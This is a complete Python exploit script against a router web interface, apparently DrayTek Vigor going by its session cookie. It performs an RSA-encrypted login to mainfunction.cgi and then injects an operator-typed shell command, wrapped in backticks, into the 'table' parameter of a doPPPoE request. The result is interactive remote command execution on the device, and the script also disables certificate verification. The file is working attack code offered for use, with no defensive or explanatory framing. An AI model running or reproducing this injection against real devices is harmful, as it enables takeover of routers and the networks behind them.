import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

import requests
import argparse
import urllib.parse

from base64 import b64encode
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding

def ParseArgs():
    parser = argparse.ArgumentParser(description="Process host, port, username, and password.")
    parser.add_argument('--host', type=str, required=True, help='The host address')
    parser.add_argument('--port', type=int, required=True, help='The port number')
    parser.add_argument('--username', type=str, required=True, help='The username')
    parser.add_argument('--password', type=str, required=True, help='The password')

    args = parser.parse_args()
    return args

def EncryptAlgo(plainText, Modulus):    
    E = "10001"
    N = Modulus.split('=')[1]

    modulus = int(N, 16)
    message = b64encode(plainText)
    public_exponent = int(E, 16)

    public_key = rsa.RSAPublicNumbers(public_exponent, modulus).public_key()
    ciphertext = public_key.encrypt(
        message,
        padding.PKCS1v15()
    )
    b64ciphertext = b64encode(ciphertext)
    return b64ciphertext

def Exp(IP, PORT, USERNAME, PASSWORD):
    url = "http://%s:%d/cgi-bin/mainfunction.cgi" % (IP, PORT)
    headers = {
        "Host": IP,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "action": "get_RSA_Key",
        "rtick": "1720029285341"
    }

    response = requests.post(url, headers=headers, data=data, verify=False)
    assert response.status_code == 200
    
    Modulus = response.text
    keyPath = Modulus.split('=')[1][:30]

    loginUser = EncryptAlgo(USERNAME.encode(), Modulus)
    loginPwd  = EncryptAlgo(PASSWORD.encode(), Modulus)
    
    data = {
        'action': 'login',
        'keyPath': keyPath,
        'loginUser': loginUser, 
        'loginPwd': loginPwd,
        'formcaptcha': 'bnVsbA==',
        'rtick': 'null'
    }
    response = requests.post(url, headers=headers, data=data, verify=False)
    assert response.status_code == 200

    if 'Set-Cookie' in response.headers:
        cookies = response.headers['Set-Cookie']
        for cookie in cookies.split(';'):
            if 'SESSION_ID_VIGOR' in cookie:
                session_id_vigor = cookie.split('=')[1]
                headers['Cookie'] = 'SESSION_ID_VIGOR=%s' % (session_id_vigor)
                break

    cmd = input('> ')
    print('[+] executing %s' % cmd)
    cmd = '`%s`' % cmd
    cmd = urllib.parse.quote(cmd)
    data = 'action=doPPPoE&table=%s&option=terminate' % (cmd)
    response = requests.post(url, headers=headers, data=data, verify=False)
    assert response.status_code == 200
    print('[+] OK')

if __name__ == '__main__':
    args = ParseArgs()
    Exp(args.host, args.port, args.username, args.password)